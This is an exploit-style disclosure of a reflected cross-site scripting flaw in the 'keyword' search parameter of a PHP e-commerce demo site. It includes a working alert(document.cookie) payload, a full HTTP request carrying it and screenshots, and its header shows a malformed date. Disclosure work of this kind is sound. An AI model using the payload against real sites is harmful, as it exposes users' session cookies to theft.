# E-commerce_Site-Reflected_Cross_Site_Scripting
+ **Exploit Title:** E-commerce_Site-Reflected_Cross_Site_Scripting
+ **Date:** 2023-23-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/e-commerce-site-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2019/10/E-COMMERCE_SITE_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-

## References: 

## Description:
E-commerce Site 1.0 allows Reflected Cross-site Scripting via parameter 'keyword' in "/ecommerce/search.php". E-commerce Site is vulnerable to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Proof of Concept:
+ Go to the Search for Product: "http://localhost/ecommerce/search.php"
+ Use this payload: `<video/src=x onerror=alert(document.cookie)>`
+ Fill the payload and Enter.
+ The XSS will be triggered.
+ Alerts will pop-up.
+ Example request for 'keyword' parameter:
```
POST /ecommerce/search.php HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 55
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=ml92pvb86qoqm8rjs4vhgk86v7
Referer: http://localhost/ecommerce/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

keyword=%3Cvideo/src=x%20onerror=alert(document.cookie)%3E%20
```

+ Example payload:
```
<video/src=x onerror=alert(document.cookie)>
```
![1-1](https://github.com/h4md153v63n/CVEs/assets/5091265/85674d4d-34f4-4dc3-95b4-b010401dd04e)
<br>
<br>
![1-2](https://github.com/h4md153v63n/CVEs/assets/5091265/5225831f-4eef-41df-bd4e-c9e41901dce0)
